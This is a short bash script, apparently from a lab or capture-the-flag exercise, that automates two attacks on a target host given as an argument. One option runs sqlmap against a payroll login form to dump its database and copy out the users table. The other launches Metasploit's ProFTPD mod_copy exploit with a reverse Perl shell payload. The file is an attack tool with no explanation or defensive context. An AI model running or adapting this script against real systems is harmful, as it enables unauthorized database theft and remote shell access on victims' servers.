#!/bin/bash

OPTION=$1
TARGET=$2


if [ $OPTION -eq 1 ]
then 
	sqlmap -u http://$TARGET/payroll_app.php --data="user=admin&password=admin&s=OK" --dump 
	mv ~/.sqlmap/output/$TARGET/dump/payroll/users.csv ~/
elif [ $OPTION -eq 2 ]
then
	msfconsole -q -x "use exploit/unix/ftp/proftpd_modcopy_exec; set rhost $TARGET; set sitepath /var/www/html; set exploit cmd/unix/reverse_perl; run;"
else
	echo "Not valid. Enter either 1 or 2"
fi
